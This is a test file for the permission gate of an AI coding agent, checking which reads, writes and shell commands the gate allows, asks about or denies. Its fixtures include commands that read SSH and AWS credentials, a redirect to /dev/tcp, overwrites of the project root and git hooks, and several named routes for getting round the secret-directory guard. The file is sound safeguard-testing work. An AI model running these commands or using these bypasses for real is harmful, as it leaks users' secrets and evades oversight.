import path from "node:path";
import { describe, expect, it } from "vitest";
import { classifyCommandLine } from "../../../src/core/policy/command.ts";
import { evaluateGate as evaluateGateCore, type GateContext, type GateResult, type ToolAction } from "../../../src/core/policy/gate.ts";
import type { PathFacts, PathPlatform } from "../../../src/core/policy/paths.ts";
import type { RouteState } from "../../../src/core/route/types.ts";

const ROOT = "/w/proj";
const WT = "/w/wt";
const HOME = "/h";
/** `<FACTORY_HOME>/runs`: every run's ledger is protected, not only the current one (review M3). */
const LEDGER = "/h/.factory/runs";
const RUN_LEDGER = `${LEDGER}/proj-0123456789ab/20261101T000000Z-42/events.jsonl`;

const ANSWER: RouteState = { route: "answer", writeRoots: [], needsReclassification: false };
const SMALL: RouteState = { route: "small", tier: "small", taskId: "small-1", writeRoots: [ROOT], needsReclassification: false };
const FEATURE: RouteState = {
  route: "feature",
  tier: "feature",
  taskId: "t1",
  worktree: WT,
  writeRoots: [WT],
  needsReclassification: false,
};

function ctx(over: Partial<GateContext> = {}): GateContext {
  return {
    route: SMALL,
    mode: "interactive",
    autonomy: "medium",
    home: HOME,
    piAgentDir: "/h/.pi/agent",
    projectRoot: ROOT,
    tmpRoots: ["/tmp"],
    ledgerDir: LEDGER,
    projectCommands: [],
    taskFileExists: true,
    gitDirs: [`${ROOT}/.git`],
    ...over,
  };
}

/** PathFacts as the extension would compute them; relative inputs resolve against `base`. */
function fact(input: string, resolved?: string, base = ROOT, platform: PathPlatform = "posix"): PathFacts {
  const r = resolved ?? (input.startsWith("/") ? input : input.startsWith("~/") ? `${HOME}/${input.slice(2)}` : `${base}/${input}`);
  return { input, resolved: r, platform };
}

const read = (input?: string, resolved?: string): ToolAction =>
  input === undefined ? { kind: "read", tool: "ls" } : { kind: "read", tool: "read", path: fact(input, resolved) };

function write(input: string, opts: { resolved?: string; base?: string; machine?: boolean; tool?: "write" | "edit"; targetExists?: boolean } = {}): ToolAction {
  const a: ToolAction = {
    kind: "write",
    tool: opts.tool ?? "write",
    path: fact(input, opts.resolved, opts.base),
    touchesMachineSection: opts.machine ?? false,
  };
  if (opts.targetExists !== undefined) a.targetExists = opts.targetExists;
  return a;
}

/** R59: the execution-directory facts the extension computes for `command` run with cwd `base` (lexical, posix). */
function execDirsFor(command: string, base: string): PathFacts[][] {
  return classifyCommandLine(command, { projectCommands: [] }).execDirs.map((candidates) =>
    candidates.map((chain) => {
      const dir = chain.reduce((b, w) => path.posix.resolve(b, w.startsWith("~/") ? `${HOME}/${w.slice(2)}` : w), base);
      return { input: dir, resolved: dir, platform: "posix" as const };
    }),
  );
}

/** Commands built without execution directories run in the project root (the small route's write root). */
function evaluateGate(action: ToolAction, c: GateContext): GateResult {
  if (action.kind === "command" && action.tool === "bash" && action.execDirs === undefined) {
    return evaluateGateCore({ ...action, execDirs: execDirsFor(action.command, ROOT) }, c);
  }
  return evaluateGateCore(action, c);
}

function bash(command: string, facts: [string, string?][] = [], base = ROOT): ToolAction {
  return { kind: "command", tool: "bash", command, pathFacts: facts.map(([i, r]) => fact(i, r, base)), execDirs: execDirsFor(command, base) };
}

const UNATTENDED = { mode: "unattended" } as const;
const HIGH = { autonomy: "high" } as const;

describe("evaluateGate: tool kinds", () => {
  it("factory tools are allowed (they validate themselves)", () => {
    const r = evaluateGate({ kind: "factory", tool: "set_route" }, ctx({ route: ANSWER }));
    expect(r).toMatchObject({ decision: "allow", reconcile: false });
  });

  it("an unknown MCP tool asks", () => {
    expect(evaluateGate({ kind: "unknown", tool: "mcp__github__create_issue" }, ctx()).decision).toBe("ask");
  });

  it("the powershell tool always asks with class unknown", () => {
    const r = evaluateGate({ kind: "command", tool: "powershell", command: "Get-ChildItem", pathFacts: [] }, ctx());
    expect(r).toMatchObject({ decision: "ask", class: "unknown" });
  });

  it("always returns a reason", () => {
    expect(evaluateGate({ kind: "factory", tool: "run_check" }, ctx()).reason).not.toBe("");
  });
});

describe("evaluateGate: read tools", () => {
  it("reads inside the project are allowed on every route", () => {
    expect(evaluateGate(read("src/a.ts"), ctx({ route: ANSWER })).decision).toBe("allow");
  });

  it("a read tool without a path is allowed", () => {
    expect(evaluateGate(read(), ctx({ route: ANSWER })).decision).toBe("allow");
  });

  it("reading .env asks (secrets)", () => {
    expect(evaluateGate(read(".env"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("reading .env.example is allowed", () => {
    expect(evaluateGate(read(".env.example"), ctx()).decision).toBe("allow");
  });

  it("reading ~/.ssh/id_rsa asks even outside the project", () => {
    expect(evaluateGate(read("/h/.ssh/id_rsa"), ctx({ route: ANSWER }))).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("reading through a symlink into a secret asks", () => {
    expect(evaluateGate(read("notes.txt", "/h/.aws/credentials"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R23: a read tool on home, an ancestor of home or a secret-holding home dir asks (secrets)", () => {
    for (const target of ["/h", "/", "/h/.aws", "/h/.config", "/h/.config/gh", "/h/.config/gcloud", "/h/.pi", "/h/.pi/agent", "/h/.codex", "/h/.docker", "/h/.kube", "/h/.ssh", "/h/.gnupg", "/h/.azure"]) {
      const r = evaluateGate({ kind: "read", tool: "grep", path: fact(target) }, ctx({ route: ANSWER, mode: "unattended" }));
      expect(r, target).toMatchObject({ decision: "ask", hardGate: "secrets" });
    }
  });

  it("R23: a custom piAgentDir and its ancestors ask", () => {
    const c = ctx({ piAgentDir: "/opt/agents/pi" });
    expect(evaluateGate({ kind: "read", tool: "grep", path: fact("/opt/agents/pi") }, c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate({ kind: "read", tool: "grep", path: fact("/opt/agents") }, c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R24: the Pi ls and find tools (names only) are exempt from the secret-dir guard", () => {
    for (const tool of ["ls", "find"]) {
      for (const target of ["/h", "/h/.aws", "/h/.pi/agent"]) {
        expect(evaluateGate({ kind: "read", tool, path: fact(target) }, ctx({ route: ANSWER })).decision, `${tool} ${target}`).toBe("allow");
      }
    }
  });

  it("R24: ls/find tools still ask for a secret path itself", () => {
    expect(evaluateGate({ kind: "read", tool: "ls", path: fact("/h/.ssh") }, ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R24: any other read tool name keeps the guard", () => {
    expect(evaluateGate({ kind: "read", tool: "read", path: fact("/h") }, ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate({ kind: "read", tool: "LS", path: fact("/h") }, ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R23: R23 does not catch ordinary directories (project, home subdirs, unrelated)", () => {
    for (const target of [ROOT, "/h/projects", "/h/.config/nvim", "/h/.aws-notes", "/opt"]) {
      expect(evaluateGate({ kind: "read", tool: "grep", path: fact(target) }, ctx()).decision, target).toBe("allow");
    }
  });

  it("R23: the win32 home is matched case-insensitively", () => {
    const c = ctx({ home: "C:\\Users\\u", piAgentDir: "C:\\Users\\u\\.pi\\agent", projectRoot: "C:\\w\\proj", ledgerDir: "C:\\Users\\u\\.factory\\runs", tmpRoots: [], gitDirs: [], route: { ...ANSWER } });
    const path: PathFacts = { input: "c:\\users\\U\\.AWS", resolved: "c:\\users\\U\\.AWS", platform: "win32" };
    expect(evaluateGate({ kind: "read", tool: "grep", path }, c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("reading outside the project (non-secret) is allowed", () => {
    expect(evaluateGate(read("/etc/hosts"), ctx()).decision).toBe("allow");
  });
});

describe("evaluateGate: write tools", () => {
  it("answer route write is denied", () => {
    expect(evaluateGate(write("src/a.ts"), ctx({ route: ANSWER })).decision).toBe("deny");
  });

  it("a route needing reclassification denies writes", () => {
    expect(evaluateGate(write("src/a.ts"), ctx({ route: { ...SMALL, needsReclassification: true } })).decision).toBe("deny");
  });

  it("small route write in the project root is allowed", () => {
    expect(evaluateGate(write("src/a.ts"), ctx())).toMatchObject({ decision: "allow", reconcile: false });
  });

  it("small route edit in the project root is allowed", () => {
    expect(evaluateGate(write("README.md", { tool: "edit" }), ctx()).decision).toBe("allow");
  });

  it("write via a symlink that resolves outside asks (interactive)", () => {
    const r = evaluateGate(write("link/x", { resolved: "/elsewhere/x" }), ctx());
    expect(r).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("write via a symlink that resolves outside is denied (unattended)", () => {
    const r = evaluateGate(write("link/x", { resolved: "/elsewhere/x" }), ctx(UNATTENDED));
    expect(r).toMatchObject({ decision: "deny", hardGate: "outside-root-write" });
  });

  it("write into a tmp root still needs a write root (asks)", () => {
    expect(evaluateGate(write("/tmp/x"), ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("writing a secret in the project asks (secrets)", () => {
    expect(evaluateGate(write(".env.local"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it(".factory/config.json write is denied", () => {
    expect(evaluateGate(write(".factory/config.json"), ctx()).decision).toBe("deny");
  });

  it(".factory/config.json in the main checkout is denied on a feature route (outside the worktree)", () => {
    expect(evaluateGate(write(`${ROOT}/.factory/config.json`), ctx({ route: FEATURE })).decision).toBe("deny");
  });

  it(".factory/config.json is denied case-insensitively on win32", () => {
    const action: ToolAction = {
      kind: "write",
      tool: "write",
      path: { input: "C:\\w\\proj\\.FACTORY\\Config.json", resolved: "C:\\w\\proj\\.FACTORY\\Config.json", platform: "win32" },
      touchesMachineSection: false,
    };
    const c = ctx({
      home: "C:\\Users\\u",
      piAgentDir: "C:\\Users\\u\\.pi\\agent",
      projectRoot: "C:\\w\\proj",
      ledgerDir: "C:\\Users\\u\\.factory\\runs\\p\\r",
      tmpRoots: [],
      gitDirs: ["C:\\w\\proj\\.git"],
      route: { ...SMALL, writeRoots: ["C:\\w\\proj"] },
    });
    expect(evaluateGate(action, c).decision).toBe("deny");
  });

  it("writing this task's own task, spec and plan files is allowed", () => {
    for (const dir of ["tasks", "specs", "plans"]) {
      expect(evaluateGate(write(`.factory/knowledge/${dir}/small-1.md`), ctx()).decision, dir).toBe("allow");
    }
  });

  it("another task's file is denied", () => {
    expect(evaluateGate(write(".factory/knowledge/tasks/small-2.md"), ctx()).decision).toBe("deny");
    expect(evaluateGate(write(".factory/knowledge/specs/other.md"), ctx()).decision).toBe("deny");
  });

  it("a new decision file is allowed; an existing or unknown one is denied", () => {
    expect(evaluateGate(write(".factory/knowledge/decisions/0001-x.md", { targetExists: false }), ctx()).decision).toBe("allow");
    expect(evaluateGate(write(".factory/knowledge/decisions/0001-x.md", { targetExists: true }), ctx()).decision).toBe("deny");
    expect(evaluateGate(write(".factory/knowledge/decisions/0001-x.md"), ctx()).decision).toBe("deny");
  });

  it("machine-section edit is denied", () => {
    const r = evaluateGate(write(".factory/knowledge/tasks/small-1.md", { tool: "edit", machine: true }), ctx());
    expect(r.decision).toBe("deny");
  });

  it("writing under the run ledger directory is denied, not asked", () => {
    expect(evaluateGate(write(RUN_LEDGER), ctx()).decision).toBe("deny");
  });

  it("writing another run's ledger is denied too", () => {
    expect(evaluateGate(write(`${LEDGER}/other-proj-ffffffffffff/20261030T000000Z-7/events.jsonl`), ctx()).decision).toBe("deny");
  });

  it("high autonomy in interactive mode still asks (not denies) for a write outside the roots", () => {
    expect(evaluateGate(write("/elsewhere/x"), ctx(HIGH))).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("feature write before the task file exists is denied", () => {
    const r = evaluateGate(write("src/a.ts", { base: WT }), ctx({ route: FEATURE, taskFileExists: false }));
    expect(r.decision).toBe("deny");
  });

  it("writing the task file itself before it exists is allowed", () => {
    const r = evaluateGate(write(".factory/knowledge/tasks/t1.md", { base: WT }), ctx({ route: FEATURE, taskFileExists: false }));
    expect(r.decision).toBe("allow");
  });

  it("feature write in the worktree after the task file exists is allowed", () => {
    expect(evaluateGate(write("src/a.ts", { base: WT }), ctx({ route: FEATURE })).decision).toBe("allow");
  });

  it("feature write into the main checkout asks (outside the worktree)", () => {
    expect(evaluateGate(write(`${ROOT}/src/a.ts`), ctx({ route: FEATURE }))).toMatchObject({
      decision: "ask",
      hardGate: "outside-root-write",
    });
  });

  it("R21: writing into <root>/.git asks (destructive)", () => {
    expect(evaluateGate(write(".git/hooks/pre-commit"), ctx())).toMatchObject({ decision: "ask", hardGate: "destructive" });
    expect(evaluateGate(write(".git/config", { tool: "edit" }), ctx())).toMatchObject({ decision: "ask", hardGate: "destructive" });
  });

  it("R21: writing into a declared git dir asks even without a .git segment", () => {
    const c = ctx({ gitDirs: [`${ROOT}/.git`, `${ROOT}/gitdir-x`] });
    expect(evaluateGate(write("gitdir-x/config"), c)).toMatchObject({ decision: "ask", hardGate: "destructive" });
  });

  it("R21: a nested .git segment (submodule, worktree .git file) asks", () => {
    expect(evaluateGate(write("vendor/lib/.git/config"), ctx())).toMatchObject({ decision: "ask", hardGate: "destructive" });
    expect(evaluateGate(write(".git", { base: WT }), ctx({ route: FEATURE }))).toMatchObject({ decision: "ask", hardGate: "destructive" });
  });

  it("a .gitignore edit is not a git dir write", () => {
    expect(evaluateGate(write(".gitignore"), ctx()).decision).toBe("allow");
  });

  it("an unresolvable target fails closed", () => {
    const r = evaluateGate(write("x", { resolved: "relative/x" }), ctx());
    expect(r.decision).not.toBe("allow");
  });
});

describe("evaluateGate: commands", () => {
  it("git push asks (interactive and unattended) with class remote-mutating", () => {
    for (const over of [{}, UNATTENDED]) {
      expect(evaluateGate(bash("git push"), ctx(over))).toMatchObject({
        decision: "ask",
        class: "remote-mutating",
        hardGate: "remote-mutation",
      });
    }
  });

  it("git push asks on the answer route too (hard classes still ask)", () => {
    expect(evaluateGate(bash("git push"), ctx({ route: ANSWER }))).toMatchObject({ decision: "ask", hardGate: "remote-mutation" });
  });

  it("ls; git push asks remote-mutation (segment set, not a scalar)", () => {
    expect(evaluateGate(bash("ls; git push"), ctx())).toMatchObject({ decision: "ask", hardGate: "remote-mutation" });
  });

  it("a destructive command asks (destructive)", () => {
    expect(evaluateGate(bash("git reset --hard"), ctx(UNATTENDED))).toMatchObject({ decision: "ask", hardGate: "destructive" });
  });

  it("npm test unattended is allowed", () => {
    expect(evaluateGate(bash("npm test"), ctx(UNATTENDED))).toMatchObject({ decision: "allow", reconcile: false });
  });

  it("npm test with high autonomy is allowed", () => {
    expect(evaluateGate(bash("npm test"), ctx(HIGH)).decision).toBe("allow");
  });

  it("a non-allowlisted local-write in root: interactive small allows, unattended and high autonomy ask", () => {
    const action = bash("rm x", [["x"]]);
    expect(evaluateGate(action, ctx()).decision).toBe("allow");
    expect(evaluateGate(action, ctx(UNATTENDED)).decision).toBe("ask");
    expect(evaluateGate(action, ctx(HIGH)).decision).toBe("ask");
  });

  it("sed -i with a plain substitution is allowlisted (Task 2 table): allowed unattended", () => {
    // R25: the script is path-like, so the extension supplies a (non-secret) fact for it too.
    expect(evaluateGate(bash("sed -i s/a/b/ file", [["file"], ["s/a/b/"]]), ctx(UNATTENDED)).decision).toBe("allow");
  });

  it("sed -i with a non-substitution script is unknown: asks in both modes", () => {
    expect(evaluateGate(bash("sed -i x file"), ctx())).toMatchObject({ decision: "ask", class: "unknown" });
    expect(evaluateGate(bash("sed -i x file"), ctx(UNATTENDED)).decision).toBe("ask");
  });

  it("an unknown command asks on a change route", () => {
    expect(evaluateGate(bash("foo bar"), ctx())).toMatchObject({ decision: "ask", class: "unknown" });
  });

  it("an untokenizable command asks on a change route", () => {
    expect(evaluateGate(bash("echo $(git push)"), ctx()).decision).toBe("ask");
  });

  it("npm test on the answer route is allowed with reconcile", () => {
    expect(evaluateGate(bash("npm test"), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: true });
  });

  it("a read-only command on the answer route is allowed without reconcile", () => {
    expect(evaluateGate(bash("git status"), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: false });
  });

  it("an unreconcilable command on the answer route is denied (declare a change route)", () => {
    const r = evaluateGate(bash("foo bar"), ctx({ route: ANSWER }));
    expect(r.decision).toBe("deny");
    expect(r.reason).toMatch(/change route/);
  });

  it("a write into the project on the answer route is denied, not asked", () => {
    expect(evaluateGate(bash("touch x", [["x"]]), ctx({ route: ANSWER })).decision).toBe("deny");
    expect(evaluateGate(bash("npm test > out.txt", [["out.txt"]]), ctx({ route: ANSWER })).decision).toBe("deny");
  });

  it("a write into tmp on the answer route is allowed with reconcile", () => {
    expect(evaluateGate(bash("mkdir /tmp/x", [["/tmp/x"]]), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: true });
  });

  it("needs_reclassification + ls is allowed", () => {
    expect(evaluateGate(bash("ls"), ctx({ route: { ...SMALL, needsReclassification: true } })).decision).toBe("allow");
  });

  it("needs_reclassification + npm test is denied (even on the answer route)", () => {
    expect(evaluateGate(bash("npm test"), ctx({ route: { ...SMALL, needsReclassification: true } })).decision).toBe("deny");
    expect(evaluateGate(bash("npm test"), ctx({ route: { ...ANSWER, needsReclassification: true } })).decision).toBe("deny");
  });

  it("tee ../x asks outside-root-write", () => {
    expect(evaluateGate(bash("tee ../x", [["../x", "/w/x"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("a redirect into tmp is allowed on a change route", () => {
    expect(evaluateGate(bash("ls > /tmp/out", [["/tmp/out"]]), ctx(UNATTENDED)).decision).toBe("allow");
  });

  it("a path argument without path facts fails closed (asks)", () => {
    expect(evaluateGate(bash("tee ../x"), ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("cat ~/.ssh/id_rsa asks (secrets via read-argument facts)", () => {
    expect(evaluateGate(bash("cat ~/.ssh/id_rsa", [["~/.ssh/id_rsa"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("a read-command argument outside the project is not a write (allowed)", () => {
    expect(evaluateGate(bash("cat /etc/hosts", [["/etc/hosts"]]), ctx({ route: ANSWER })).decision).toBe("allow");
  });

  it("R21: a redirect into .git asks (destructive)", () => {
    expect(evaluateGate(bash("echo x > .git/hooks/pre-commit", [[".git/hooks/pre-commit"]]), ctx())).toMatchObject({
      decision: "ask",
      hardGate: "destructive",
    });
  });

  it("a command write into .factory/config.json is denied", () => {
    expect(evaluateGate(bash("sed -i s/a/b/ .factory/config.json", [[".factory/config.json"]]), ctx()).decision).toBe("deny");
  });

  it("a command write under the ledger dir is denied", () => {
    expect(evaluateGate(bash(`tee ${RUN_LEDGER}`, [[RUN_LEDGER]]), ctx()).decision).toBe("deny");
  });

  it("a command write in the feature worktree before the task file exists is denied", () => {
    const r = evaluateGate(bash("touch src/a.ts", [["src/a.ts"]], WT), ctx({ route: FEATURE, taskFileExists: false }));
    expect(r.decision).toBe("deny");
  });

  it("I1: non-read-only git commands on the answer route are denied (not reconcilable)", () => {
    for (const command of ["git commit -m x", "git add -A && git commit -m x", "git switch -c foo", "git checkout -b foo", "git stash push -u", "git add ."]) {
      const r = evaluateGate(bash(command), ctx({ route: ANSWER, mode: "unattended" }));
      expect(r.decision, command).toBe("deny");
      expect(r.reconcile, command).toBe(false);
    }
  });

  it("I1: read-only git on the answer route is still allowed", () => {
    expect(evaluateGate(bash("git log --oneline -5 && npm test"), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: true });
  });

  it("I1: git commit on a change route is unaffected", () => {
    expect(evaluateGate(bash("git commit -m x"), ctx(UNATTENDED)).decision).toBe("allow");
  });

  it("I2: a command write to the current task file is denied (machine section)", () => {
    const task = ".factory/knowledge/tasks/t1.md";
    const c = ctx({ route: FEATURE, mode: "unattended" });
    expect(evaluateGate(bash(`sed -i s/phase/x/ ${task}`, [[task]], WT), c).decision).toBe("deny");
    expect(evaluateGate(bash(`tee ${task}`, [[task]], WT), c).decision).toBe("deny");
    expect(evaluateGate(bash(`rm ${task}`, [[task]], WT), ctx({ route: FEATURE })).decision).toBe("deny");
    expect(evaluateGate(bash(`echo x >> ${task}`, [[task]], WT), ctx({ route: FEATURE })).decision).toBe("deny");
  });

  it("I2: the small route's task file is protected from commands too", () => {
    const task = ".factory/knowledge/tasks/small-1.md";
    expect(evaluateGate(bash(`touch ${task}`, [[task]]), ctx()).decision).toBe("deny");
  });

  it("I2: the write tool may still write the task file", () => {
    expect(evaluateGate(write(".factory/knowledge/tasks/t1.md", { base: WT }), ctx({ route: FEATURE })).decision).toBe("allow");
  });

  it("I3a: a .factory segment in a command write path outside the roots is denied", () => {
    const c = ctx(UNATTENDED);
    expect(evaluateGate(bash("tee /tmp/payload/.factory/config.json", [["/tmp/payload/.factory/config.json"]]), c).decision).toBe("deny");
    expect(evaluateGate(bash(`cp -R /tmp/x/.factory ${ROOT}`, [["/tmp/x/.factory"], [ROOT]]), c).decision).toBe("deny");
    expect(evaluateGate(bash(`mv /tmp/x/.FACTORY ${ROOT}`, [["/tmp/x/.FACTORY"], [ROOT]]), c).decision).toBe("deny");
  });

  it("I3a: inside a root, a nested .factory segment keeps the root-relative rule", () => {
    expect(evaluateGate(bash("touch docs/.factory/notes.md", [["docs/.factory/notes.md"]]), ctx(UNATTENDED)).decision).toBe("allow");
  });

  it("I3b: a command write target equal to a write root or the project root asks (destructive)", () => {
    const c = ctx(UNATTENDED);
    expect(evaluateGate(bash(`mv ${ROOT} /tmp/p`, [[ROOT], ["/tmp/p"]]), c)).toMatchObject({ decision: "ask", hardGate: "destructive" });
    expect(evaluateGate(bash(`cp -R /tmp/payload ${ROOT}`, [["/tmp/payload"], [ROOT]]), c)).toMatchObject({ decision: "ask", hardGate: "destructive" });
    expect(evaluateGate(bash("cp -R /tmp/payload .", [["/tmp/payload"], [".", ROOT]]), c)).toMatchObject({ decision: "ask", hardGate: "destructive" });
    const f = ctx({ route: FEATURE, mode: "unattended" });
    expect(evaluateGate(bash(`cp -R /tmp/payload ${WT}`, [["/tmp/payload"], [WT]], WT), f)).toMatchObject({ decision: "ask", hardGate: "destructive" });
  });

  it("I3b: the project root as a target on a feature route is outside the worktree and still asks", () => {
    expect(evaluateGate(bash(`cp -R /tmp/payload ${ROOT}`, [["/tmp/payload"], [ROOT]]), ctx({ route: FEATURE })).decision).toBe("ask");
  });

  it("M1: an input redirection is a read, not a write", () => {
    expect(evaluateGate(bash("grep x < README.md", [["README.md"]]), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: false });
    expect(evaluateGate(bash("wc -l < /etc/hosts", [["/etc/hosts"]]), ctx()).decision).toBe("allow");
    expect(evaluateGate(bash("cat < .factory/config.json", [[".factory/config.json"]]), ctx()).decision).toBe("allow");
  });

  it("M1: an input redirection from a secret still asks (secrets)", () => {
    expect(evaluateGate(bash("cat < .env", [[".env"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("M1: an input redirection without path facts fails closed (asks)", () => {
    expect(evaluateGate(bash("cat < x"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("M2: prettier --write on .factory/config.json is denied", () => {
    const t = ".factory/config.json";
    expect(evaluateGate(bash(`prettier --write ${t}`, [[t]]), ctx(UNATTENDED)).decision).toBe("deny");
  });

  it("M4: a remote-mutating redirect reports remote-mutation, not outside-root-write", () => {
    const r = evaluateGate(bash("cat x > /dev/tcp/h/80", [["/dev/tcp/h/80"]]), ctx());
    expect(r).toMatchObject({ decision: "ask", hardGate: "remote-mutation" });
  });

  it("R23: recursive grep and rg in bash are unknown (ask on change routes, deny on answer)", () => {
    expect(evaluateGate(bash("grep -r aws_secret ~/.aws"), ctx())).toMatchObject({ decision: "ask", class: "unknown" });
    expect(evaluateGate(bash("rg PASSWORD ."), ctx({ route: ANSWER })).decision).toBe("deny");
  });

  it("R24: bash read arguments on secret-holding directories ask (pipelines turn names into contents)", () => {
    const c = ctx({ route: ANSWER, mode: "unattended" });
    expect(evaluateGate(bash("ls ~/", [["~/", "/h"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("find ~/.aws -type f", [["~/.aws"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("du -sh ~/.config", [["~/.config"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("ls src", [["src"]]), c).decision).toBe("allow");
  });

  it("R24: the find | sort --files0-from bypass is closed", () => {
    const action = bash("find ~/.aws -type f -print0 | sort --files0-from=-", [["~/.aws"]]);
    // Change route: the secret-dir guard asks. Answer route: the unknown segment is denied before any ask.
    expect(evaluateGate(action, ctx({ mode: "unattended" }))).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(action, ctx({ route: ANSWER, mode: "unattended" })).decision).toBe("deny");
    expect(evaluateGate(bash("find ~/.aws -type f -print0 | sort --files0-from=-"), ctx({ route: ANSWER })).decision).toBe("deny");
  });

  it("R24: the git diff --no-index bypass is closed", () => {
    const facts: [string, string?][] = [["~/.aws"], ["/tmp/empty"]];
    const c = ctx({ route: ANSWER, mode: "unattended" });
    expect(evaluateGate(bash("git diff --no-index ~/.aws /tmp/empty", facts), ctx(UNATTENDED))).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("git diff --no-index ~/.aws /tmp/empty", facts), c).decision).toBe("deny");
    expect(evaluateGate(bash("git diff --no-index ~/.aws /tmp/empty"), c).decision).toBe("deny");
    expect(evaluateGate(bash("git diff --no-index /h /tmp/empty"), c).decision).toBe("deny");
  });

  it("R24: a git -C directory is a read fact checked for secrets", () => {
    expect(evaluateGate(bash("git -C ~/ status", [["~/", "/h"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("git -C ~/ status"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R41: git -C is unknown (operands would resolve against another directory): denied on the answer route", () => {
    expect(evaluateGate(bash("git -C ../other status", [["../other", "/w/other"]]), ctx({ route: ANSWER })).decision).toBe("deny");
    expect(evaluateGate(bash("git -C ../other status", [["../other", "/w/other"]]), ctx(UNATTENDED))).toMatchObject({ decision: "ask", class: "unknown" });
  });

  it("R24: git stash list is read-only and runs on the answer route", () => {
    expect(evaluateGate(bash("git stash list"), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", reconcile: false });
  });

  it("R24: a write target on a secret-holding directory is not a read (root target and outside rules apply instead)", () => {
    expect(evaluateGate(bash("mkdir /tmp/h", [["/tmp/h"]]), ctx(UNATTENDED)).decision).toBe("allow");
  });

  it("R25/R40: a file named by a read-path option value whose fact is a secret asks, separate, attached or long", () => {
    // Fix round 4: the old fixtures (`head -n <secret>`, `cut -d<secret>`) named a count or a delimiter, not a file.
    const c = ctx({ route: ANSWER, mode: "unattended" });
    expect(evaluateGate(bash("du -X ~/.aws/credentials x", [["~/.aws/credentials"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("du -sX/h/.aws/credentials x", [["/h/.aws/credentials"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("date --reference=/h/.ssh/id_rsa", [["/h/.ssh/id_rsa"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R40: an opaque option value is not a read argument (no fact needed)", () => {
    const c = ctx({ route: ANSWER, mode: "unattended" });
    expect(evaluateGate(bash("cut -d/ -f1 x"), c).decision).toBe("allow");
    expect(evaluateGate(bash("head -n ~/.aws/credentials x"), c).decision).toBe("allow");
  });

  it("R25: a path-like read argument without a fact asks (secrets), on the answer route too", () => {
    expect(evaluateGate(bash("du -X ~/.aws/credentials x"), ctx({ route: ANSWER }))).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("cat ./notes.txt"), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R25: a path-like read argument with a non-secret fact is allowed", () => {
    expect(evaluateGate(bash("cat ./notes.txt", [["./notes.txt"]]), ctx({ route: ANSWER, mode: "unattended" })).decision).toBe("allow");
  });

  it("R25: the leak commands ask secrets with a secret fact (denylist plus fact check)", () => {
    const secret = "~/.aws/credentials";
    for (const command of [
      `date -f ${secret}`,
      `date --file=${secret}`,
      `file -m ${secret} x`,
      `git blame --contents ${secret} README.md`,
      `git blame -S ${secret} README.md`,
      `git blame --ignore-revs-file=${secret} README.md`,
    ]) {
      const r = evaluateGate(bash(command, [[secret]]), ctx({ mode: "unattended" }));
      expect(r, command).toMatchObject({ decision: "ask", hardGate: "secrets" });
    }
  });

  it("R25: a non-path-like word without a fact is not a file; with a secret fact it is checked", () => {
    expect(evaluateGate(bash("cat notes.txt"), ctx({ route: ANSWER })).decision).toBe("allow");
    expect(evaluateGate(bash("cat notes.txt", [["notes.txt", "/h/.aws/credentials"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("R25: URLs are not path-like", () => {
    expect(evaluateGate(bash("curl https://example.com/a/b"), ctx({ route: ANSWER })).decision).toBe("allow");
  });

  it("N-1: unknown git on the answer route keeps the generic reason", () => {
    const unknownGit = evaluateGate(bash("git grep x"), ctx({ route: ANSWER }));
    expect(unknownGit.decision).toBe("deny");
    expect(unknownGit.reason).not.toMatch(/cannot be reconciled/);
    expect(unknownGit.reason).toMatch(/change route/);
    expect(evaluateGate(bash("git commit -m x"), ctx({ route: ANSWER })).reason).toMatch(/cannot be reconciled/);
  });

  it("a project-declared command is allowed unattended", () => {
    expect(evaluateGate(bash("just check"), ctx({ ...UNATTENDED, projectCommands: [["just", "check"]] })).decision).toBe("allow");
  });
});

describe("evaluateGate: targets created by an earlier segment (R28)", () => {
  /** Facts with `exists` as the extension reports it at hook time. */
  function cmd(command: string, facts: [string, boolean][]): ToolAction {
